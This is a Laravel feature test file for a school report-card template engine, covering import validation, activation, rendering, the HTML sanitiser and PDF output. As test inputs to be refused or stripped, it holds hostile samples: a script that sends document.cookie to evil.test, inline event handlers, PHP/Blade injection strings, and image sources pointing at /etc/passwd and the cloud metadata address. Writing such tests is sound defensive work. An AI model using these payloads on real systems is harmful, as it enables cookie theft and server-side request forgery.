<?php

namespace Tests\Feature;

use App\Models\AcademicSession;
use App\Models\ReportCardTemplate;
use App\Models\School;
use App\Models\SchoolClass;
use App\Models\ScoreEntry;
use App\Models\Student;
use App\Models\Subject;
use App\Models\Term;
use App\Models\User;
use App\Models\UserProfile;
use App\Services\ReportCard\HtmlSanitizer;
use App\Services\ReportCard\ReportCardTemplateService;
use App\Services\ReportCard\TemplateException;
use App\Services\ReportCard\TemplateRenderer;
use App\Services\ReportCardPdfService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Http;
use Tests\TestCase;

class ReportCardTemplateTest extends TestCase
{
    use RefreshDatabase;

    protected School $school;
    protected User $admin;

    protected function setUp(): void
    {
        parent::setUp();

        // Report card generation must make no outbound request whatsoever —
        // QR codes are encoded locally so a school with no internet can still
        // print, and so no verification token reaches a third party. Any stray
        // request fails the test rather than being quietly stubbed.
        Http::preventStrayRequests();

        $this->school = School::create([
            'name' => 'Graceland College',
            'slug' => 'graceland',
            'subdomain' => 'graceland',
        ]);

        $this->admin = User::create([
            'name' => 'Mr Bello',
            'email' => 'bello@graceland.test',
            'password' => bcrypt('password'),
        ]);
        UserProfile::create(['school_id' => $this->school->id, 'user_id' => $this->admin->id, 'role' => 'school_admin']);
    }

    private function asAdmin()
    {
        return $this->actingAs($this->admin, 'sanctum')
            ->withServerVariables(['HTTP_HOST' => 'graceland.localhost']);
    }

    /** A bundle that satisfies the contract. */
    private function bundle(array $overrides = []): array
    {
        return array_merge([
            'engine' => ReportCardTemplate::ENGINE,
            'name' => 'Graceland Terminal Report',
            'slug' => 'graceland-terminal',
            'version' => 1,
            'page' => ['size' => 'A4', 'orientation' => 'portrait'],
            'regions' => ['header', 'scores_table', 'footer'],
            'styles' => '.report { font-size: 11px; } .crest { width: 60px; }',
            'body' => <<<'TPL'
<section class="report">
  <h1>{{ school.name | upper }}</h1>
  <p>{{ student.name }} — {{ student.class }} {{ student.arm }}</p>
  <p>Position: {{ student.position | ordinal }} of {{ student.class_size }}</p>
  <table class="scores">
    <tbody>
      {{#each scores}}
      <tr><td>{{@number}}</td><td>{{ this.subject }}</td><td>{{ this.total | number:1 }}</td><td>{{ this.grade }}</td></tr>
      {{else}}
      <tr><td colspan="4">No scores recorded.</td></tr>
      {{/each}}
    </tbody>
  </table>
  {{#if comments.class_teacher}}<p>{{ comments.class_teacher }}</p>{{/if}}
  <footer><img src="{{ verification.qr_code_url }}" alt="Verification QR"><p>{{ verification.verify_url }}</p></footer>
</section>
TPL,
        ], $overrides);
    }

    // ==================================================================
    // Import and validation
    // ==================================================================

    public function test_a_valid_bundle_imports_as_a_draft()
    {
        $response = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle());

        $response->assertStatus(201)
            ->assertJsonPath('template.status', 'draft')
            ->assertJsonPath('template.name', 'Graceland Terminal Report');

        // Importing must never change what the school is currently printing.
        $this->assertNull(ReportCardTemplate::where('status', 'active')->first());
    }

    public function test_a_bundle_declaring_the_wrong_engine_is_refused()
    {
        $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle([
            'engine' => 'someone-elses-engine/v3',
        ]))->assertStatus(422);
    }

    public function test_a_bundle_containing_a_script_tag_is_refused()
    {
        $bundle = $this->bundle();
        $bundle['body'] .= '<script>fetch("https://evil.test?c="+document.cookie)</script>';

        $this->asAdmin()->postJson('/api/v1/report-cards/templates', $bundle)
            ->assertStatus(422);

        $this->assertDatabaseCount('report_card_templates', 0);
    }

    public function test_a_bundle_with_an_inline_event_handler_is_refused()
    {
        $bundle = $this->bundle();
        $bundle['body'] = str_replace('<section class="report">', '<section class="report" onload="alert(1)">', $bundle['body']);

        $this->asAdmin()->postJson('/api/v1/report-cards/templates', $bundle)
            ->assertStatus(422);
    }

    public function test_php_and_blade_constructs_are_refused()
    {
        foreach (['<?php echo "x"; ?>', '@php dd($x); @endphp', '{{{ student.name }}}'] as $payload) {
            $bundle = $this->bundle();
            $bundle['body'] .= $payload;

            $this->asAdmin()->postJson('/api/v1/report-cards/templates', $bundle)
                ->assertStatus(422);
        }

        $this->assertDatabaseCount('report_card_templates', 0);
    }

    public function test_a_template_that_drops_the_verification_qr_is_refused()
    {
        // Result forgery is the problem the QR exists to solve. A school
        // cannot design it off the page.
        $bundle = $this->bundle();
        $bundle['body'] = str_replace(
            '<footer><img src="{{ verification.qr_code_url }}" alt="Verification QR"><p>{{ verification.verify_url }}</p></footer>',
            '<footer>Graceland College</footer>',
            $bundle['body']
        );

        $this->asAdmin()->postJson('/api/v1/report-cards/templates', $bundle)
            ->assertStatus(422)
            ->assertJsonFragment(['error' => 'Template is missing required content: the result verification QR code ({{ verification.qr_code_url }} or {{ verification.verify_url }}).']);
    }

    public function test_an_unclosed_block_is_caught_at_import_not_at_print_time()
    {
        $bundle = $this->bundle();
        $bundle['body'] = str_replace('{{/each}}', '', $bundle['body']);

        $this->asAdmin()->postJson('/api/v1/report-cards/templates', $bundle)
            ->assertStatus(422);
    }

    public function test_importing_the_same_version_twice_is_refused()
    {
        $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle())->assertStatus(201);

        $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle())
            ->assertStatus(422);
    }

    public function test_stylesheet_remote_imports_are_stripped_on_import()
    {
        $response = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle([
            'styles' => '@import url("https://fonts.evil.test/track.css"); .report { color: #111; }',
        ]));

        $response->assertStatus(201);

        $template = ReportCardTemplate::first();
        $this->assertStringNotContainsString('fonts.evil.test', $template->styles);
        $this->assertStringContainsString('#111', $template->styles);
        $this->assertNotEmpty($response->json('template.validation_report.style_removals'));
    }

    // ==================================================================
    // Activation
    // ==================================================================

    public function test_activating_a_template_archives_the_previous_one()
    {
        $first = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle())->json('template.id');
        $second = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle(['version' => 2]))->json('template.id');

        $this->asAdmin()->postJson("/api/v1/report-cards/templates/{$first}/activate")->assertStatus(200);
        $this->asAdmin()->postJson("/api/v1/report-cards/templates/{$second}/activate")->assertStatus(200);

        $this->assertEquals('archived', ReportCardTemplate::find($first)->status);
        $this->assertEquals('active', ReportCardTemplate::find($second)->status);

        // Exactly one design can be live, so a term's cards cannot be printed
        // from two different layouts.
        $this->assertEquals(1, ReportCardTemplate::where('status', 'active')->count());
    }

    public function test_the_active_template_cannot_be_deleted()
    {
        $id = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle())->json('template.id');
        $this->asAdmin()->postJson("/api/v1/report-cards/templates/{$id}/activate");

        $this->asAdmin()->deleteJson("/api/v1/report-cards/templates/{$id}")->assertStatus(422);
    }

    public function test_another_schools_template_is_not_reachable()
    {
        $rival = School::create(['name' => 'Rival Academy', 'slug' => 'rival', 'subdomain' => 'rival']);
        $foreign = ReportCardTemplate::create([
            'school_id' => $rival->id,
            'name' => 'Rival Design',
            'slug' => 'rival-design',
            'version' => 1,
            'engine' => ReportCardTemplate::ENGINE,
            'body' => '<p>{{ student.name }} {{#each scores}}{{/each}} {{ verification.verify_url }}</p>',
            'checksum' => str_repeat('a', 64),
            'status' => 'active',
        ]);

        $this->asAdmin()->getJson("/api/v1/report-cards/templates/{$foreign->id}")
            ->assertStatus(404);
    }

    // ==================================================================
    // Rendering and preview
    // ==================================================================

    public function test_preview_uses_fictional_sample_data_by_default()
    {
        $id = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle())->json('template.id');

        $html = $this->asAdmin()->get("/api/v1/report-cards/templates/{$id}/preview")
            ->assertStatus(200)
            ->getContent();

        $this->assertStringContainsString('GRACELAND COLLEGE', $html);
        $this->assertStringContainsString('Adaeze Nwosu', $html);
        $this->assertStringContainsString('3rd of 42', $html);
        $this->assertStringContainsString('Mathematics', $html);
    }

    public function test_data_is_escaped_so_a_record_cannot_inject_markup()
    {
        $renderer = app(TemplateRenderer::class);

        $html = $renderer->render(
            '<p>{{ student.name }}</p>',
            ['student' => ['name' => '<script>alert("xss")</script>']]
        );

        $this->assertStringNotContainsString('<script>', $html);
        $this->assertStringContainsString('&lt;script&gt;', $html);
    }

    public function test_the_dialect_has_no_way_to_reach_php_objects()
    {
        $renderer = app(TemplateRenderer::class);

        // A template cannot traverse into an object, so it cannot call
        // anything on an Eloquent model that leaked into the context.
        $html = $renderer->render(
            '[{{ school.name }}][{{ leaked.id }}]',
            ['school' => ['name' => 'Graceland'], 'leaked' => $this->school]
        );

        $this->assertEquals('[Graceland][]', $html);
    }

    public function test_each_if_and_filters_render_as_documented()
    {
        $renderer = app(TemplateRenderer::class);

        $html = $renderer->render(
            '{{#each scores}}{{@number}}:{{ this.subject }}={{ this.total | number:1 }} {{/each}}' .
            '|{{#if passed}}PASS{{else}}FAIL{{/if}}' .
            '|{{ fee | naira }}|{{ missing | default:"—" }}|{{
                position | ordinal }}',
            [
                'scores' => [
                    ['subject' => 'Maths', 'total' => 84],
                    ['subject' => 'English', 'total' => 73.5],
                ],
                'passed' => true,
                'fee' => 125000,
                'position' => 2,
            ]
        );

        $this->assertEquals('1:Maths=84.0 2:English=73.5 |PASS|₦125,000.00|—|2nd', $html);
    }

    public function test_an_empty_collection_falls_through_to_the_else_branch()
    {
        $renderer = app(TemplateRenderer::class);

        $this->assertEquals(
            'none',
            $renderer->render('{{#each scores}}x{{else}}none{{/each}}', ['scores' => []])
        );
    }

    public function test_a_runaway_template_is_stopped_rather_than_exhausting_memory()
    {
        $this->expectException(TemplateException::class);

        $renderer = app(TemplateRenderer::class);
        $rows = array_fill(0, 3000, ['a' => 'x']);

        $renderer->render(
            '{{#each rows}}{{#each rows}}{{ this.a }}{{/each}}{{/each}}',
            ['rows' => $rows]
        );
    }

    // ==================================================================
    // Sanitiser
    // ==================================================================

    public function test_sanitiser_strips_scripts_handlers_and_unsafe_image_sources()
    {
        $sanitizer = app(HtmlSanitizer::class);

        $result = $sanitizer->sanitize(
            '<div class="ok">Keep</div>' .
            '<script>alert(1)</script>' .
            '<img src="file:///etc/passwd" alt="local">' .
            '<img src="http://169.254.169.254/latest/meta-data/" alt="ssrf">' .
            '<img src="//evil.test/x.png" alt="protocol relative">' .
            '<p onclick="steal()">Text</p>' .
            '<iframe src="https://evil.test"></iframe>'
        );

        $this->assertStringContainsString('<div class="ok">Keep</div>', $result['html']);
        $this->assertStringNotContainsString('<script', $result['html']);
        $this->assertStringNotContainsString('<iframe', $result['html']);
        $this->assertStringNotContainsString('file:///etc/passwd', $result['html']);
        $this->assertStringNotContainsString('//evil.test', $result['html']);
        $this->assertStringNotContainsString('onclick', $result['html']);
        $this->assertNotEmpty($result['removals']);
    }

    public function test_sanitiser_keeps_the_data_uri_a_school_embeds_its_crest_with()
    {
        $sanitizer = app(HtmlSanitizer::class);
        $dataUri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==';

        $result = $sanitizer->sanitize('<img src="' . $dataUri . '" alt="School crest">');

        $this->assertStringContainsString($dataUri, $result['html']);
    }

    public function test_sanitiser_adds_missing_alt_text_rather_than_dropping_the_image()
    {
        $result = app(HtmlSanitizer::class)->sanitize('<img src="/storage/crest.png">');

        $this->assertStringContainsString('alt=""', $result['html']);
    }

    // ==================================================================
    // End-to-end report card
    // ==================================================================

    public function test_a_report_card_renders_through_the_schools_active_design()
    {
        [$student, $term] = $this->seedResults();

        $id = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle())->json('template.id');
        $this->asAdmin()->postJson("/api/v1/report-cards/templates/{$id}/activate");

        $html = $this->asAdmin()->get("/api/v1/report-cards/{$student->id}/{$term->id}")
            ->assertStatus(200)
            ->getContent();

        $this->assertStringContainsString('GRACELAND COLLEGE', $html);
        $this->assertStringContainsString('Chidi Okeke', $html);
        $this->assertStringContainsString('Mathematics', $html);
        $this->assertStringContainsString('A1', $html);
    }

    public function test_a_report_card_renders_as_a_downloadable_pdf()
    {
        [$student, $term] = $this->seedResults();

        $id = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle())->json('template.id');
        $this->asAdmin()->postJson("/api/v1/report-cards/templates/{$id}/activate");

        $response = $this->asAdmin()->get("/api/v1/report-cards/{$student->id}/{$term->id}?format=pdf");

        $response->assertStatus(200)
            ->assertHeader('Content-Type', 'application/pdf');

        // Real bytes, not an error page wearing a PDF content type.
        $this->assertStringStartsWith('%PDF-', $response->getContent());
    }

    public function test_the_shipped_default_design_is_used_when_a_school_has_imported_nothing()
    {
        [$student, $term] = $this->seedResults();

        $html = app(ReportCardPdfService::class)->renderHtml($student->id, $term->id);

        // The shipped design puts the school name through the `upper` filter.
        $this->assertStringContainsString('GRACELAND COLLEGE', $html);
        $this->assertStringContainsString('Report Sheet', $html);
        $this->assertStringContainsString('Mathematics', $html);
    }

    public function test_a_pending_ai_comment_still_blocks_the_report_card_through_a_custom_design()
    {
        [$student, $term] = $this->seedResults();

        ScoreEntry::withoutGlobalScopes()
            ->where('student_id', $student->id)
            ->update(['ai_comment_status' => 'pending_approval', 'teacher_comment' => 'Draft remark']);

        $id = $this->asAdmin()->postJson('/api/v1/report-cards/templates', $this->bundle())->json('template.id');
        $this->asAdmin()->postJson("/api/v1/report-cards/templates/{$id}/activate");

        $this->asAdmin()->getJson("/api/v1/report-cards/{$student->id}/{$term->id}")
            ->assertStatus(422)
            ->assertJsonFragment(['error' => 'Report card cannot be generated: AI comment for entry ID ' . ScoreEntry::withoutGlobalScopes()->first()->id . ' is still pending_approval.']);
    }

    public function test_an_unapproved_comment_is_never_exposed_to_a_template()
    {
        [$student, $term] = $this->seedResults();

        ScoreEntry::withoutGlobalScopes()
            ->where('student_id', $student->id)
            ->update(['ai_comment_status' => 'rejected', 'teacher_comment' => 'A remark nobody approved']);

        $context = app(ReportCardTemplateService::class)->buildContext(
            $student->fresh(),
            $term
        );

        $this->assertNull($context['scores'][0]['teacher_comment']);
    }

    /** @return array{0: Student, 1: Term} */
    private function seedResults(): array
    {
        $session = AcademicSession::create([
            'school_id' => $this->school->id,
            'name' => '2026/2027',
            'start_date' => '2026-09-01',
            'end_date' => '2027-07-31',
        ]);

        $term = Term::create([
            'school_id' => $this->school->id,
            'session_id' => $session->id,
            'name' => 'First Term',
            'start_date' => '2026-09-14',
            'end_date' => '2026-12-11',
        ]);

        $class = SchoolClass::create(['school_id' => $this->school->id, 'name' => 'JSS 2']);

        $studentUser = User::create([
            'name' => 'Chidi Okeke',
            'email' => 'chidi@graceland.test',
            'password' => bcrypt('password'),
        ]);
        UserProfile::create(['school_id' => $this->school->id, 'user_id' => $studentUser->id, 'role' => 'student']);

        $student = Student::create([
            'school_id' => $this->school->id,
            'user_id' => $studentUser->id,
            'class_id' => $class->id,
            'admission_number' => 'GC/2026/010',
        ]);

        $subject = Subject::create(['school_id' => $this->school->id, 'name' => 'Mathematics', 'code' => 'MTH']);

        ScoreEntry::create([
            'school_id' => $this->school->id,
            'term_id' => $term->id,
            'student_id' => $student->id,
            'subject_id' => $subject->id,
            'first_ca' => 17,
            'second_ca' => 16,
            'exam' => 51,
            'total_score' => 84,
            'grade' => 'A1',
            'ai_comment_status' => 'none',
        ]);

        return [$student->fresh(['user', 'currentClass']), $term];
    }
}
